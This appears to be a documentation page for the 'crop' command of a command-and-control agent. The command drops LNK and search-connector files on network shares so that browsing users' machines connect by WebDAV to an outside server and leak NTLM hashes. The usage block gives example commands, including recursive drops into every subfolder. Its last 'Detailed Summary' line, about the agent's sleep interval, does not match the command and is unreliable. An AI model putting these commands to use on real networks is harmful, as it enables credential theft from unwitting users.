+++
title = "crop"
chapter = false
weight = 10
hidden = false
+++

## Summary
Drop a file for collecting hashes on a network

  
- Needs Admin: False  
- Version: 1  
- Author: @domchell, @checkymander   

### Arguments

#### targetLocation

- Description: The location to drop the file 
- Required Value: False  
- Default Value: 

#### targetFilename

- Description: The filename.  
- Required Value: False  
- Default Value:  

#### targetPath

- Description: Webdav path location  
- Required Value: False  
- Default Value:  

#### targetIcon

- Description: LNK Icon location  
- Required Value: False  
- Default Value:  

#### recurse

- Description: Write the file to every sub folder of the specified path
- Required Value: False  
- Default Value:  

 #### clean

- Description: Remove the file from every sub folder of the specified path 
- Required Value: False  
- Default Value:  

## Usage
```
Crop https://github.com/mdsecactivebreach/Farmer
    created by @domchell

Crop is a tool that can create LNK files that initiate a WebDAV connection when browsing to a folder where it's stored.

Supported LNK types: .lnk, .url, .library-ms, .searchconnect-ms

Drop an LNK file
crop -targetLocation \\myserver\shared\ -targetFilename Athena.lnk -targetPath \\MyCropServer:8080\harvest -targetIcon \\MyCropServer:8080\harvest\my.ico

Drop a .searchconnect-ms
crop -targetLocation \\myserver\shared\ -targetFilename Athena.searchconnector-ms -targetPath \\MyCropServer:8080\harvest -recurse  
```


## Detailed Summary

Change the agents sleep interval.